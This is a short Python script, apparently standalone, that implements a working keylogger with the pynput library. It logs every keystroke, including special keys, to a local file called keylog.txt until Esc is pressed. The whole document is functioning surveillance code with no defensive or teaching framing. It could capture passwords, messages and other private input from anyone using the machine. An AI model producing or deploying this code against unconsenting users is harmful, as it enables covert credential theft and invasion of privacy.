import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Write the pressed key to a log file
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Enter, Backspace, Shift)
        with open("keylog.txt", "a") as f:
            f.write(f" {key}")

def on_release(key):
    if key == Key.esc:
        # Stop the listener if the Esc key is pressed
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()